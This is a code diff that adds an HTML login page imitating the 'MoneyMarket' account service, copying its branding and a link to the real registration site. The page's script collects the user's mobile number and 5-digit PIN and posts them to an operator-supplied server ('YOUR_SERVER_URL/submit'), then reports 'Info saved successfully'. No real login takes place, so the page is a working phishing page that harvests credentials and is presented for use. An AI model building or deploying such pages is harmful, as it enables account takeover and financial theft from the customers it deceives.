@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MoneyMarket Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #d11d34 url('bg.jpeg'); /* use your red patterned background image */
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      margin-top: 40px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: bold;
+      margin: 20px 0 10px;
+    }
+
+    .sub-title {
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-bottom: 1px solid white;
+      background: transparent;
+      color: white;
+      font-size: 16px;
+    }
+
+    input::placeholder {
+      color: white;
+      opacity: 0.7;
+    }
+
+    .helper-text {
+      font-size: 14px;
+      color: #ffc107; /* yellow for the links */
+      text-align: right;
+      margin: -8px 0 10px;
+      cursor: pointer;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 15px;
+      border: none;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 8px;
+      margin: 10px 0;
+      cursor: pointer;
+    }
+
+    .btn-primary {
+      background-color: #ddd;
+      color: #999;
+      cursor: not-allowed;
+    }
+
+    .btn-outline {
+      background: transparent;
+      border: 2px solid white;
+      color: white;
+    }
+
+    .terms {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .terms a {
+      color: #ffc107;
+      text-decoration: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+   <img src="logo.png" alt="MoneyMarket Logo" style="width: 240px; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto;">
+
+    <h1>Login to your</h1>
+    <div class="sub-title">MoneyMarket account</div>
+
+    <div style="margin-top: 20px;">
+      <input type="text" placeholder="Your mobile number">
+      <div class="helper-text">I forgot / changed my mobile number</div>
+
+      <input type="password" placeholder="Your 5-digit PIN">
+      <div class="helper-text">I forgot my PIN</div>
+    </div>
+
+    <button class="btn btn-primary" >Login</button>
+    <button class="btn btn-outline" src= url('https://app.moneymarketaccount.co.za/enhanced-onboarding/register')>Open an account</button>
+
+    <div class="terms">Read our <a href="#">T&Cs</a></div>
+  </div>
+  
+ <script>
+  const loginBtn = document.querySelector('.btn-primary');
+  const phoneInput = document.querySelector('input[type="text"]');
+  const pinInput = document.querySelector('input[type="password"]');
+
+  loginBtn.addEventListener('click', async () => {
+    const number = phoneInput.value.trim();
+    const pin = pinInput.value.trim();
+
+    try {
+      const res = await fetch('https://YOUR_SERVER_URL/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ number, pin })
+      });
+
+      const data = await res.json();
+      if (res.ok) {
+        alert('✅ Info saved successfully');
+      } else {
+        alert(data.message);
+      }
+    } catch (err) {
+      alert('❌ Server error');
+    }
+  });
+</script>
+
+
+</body>
+</html>
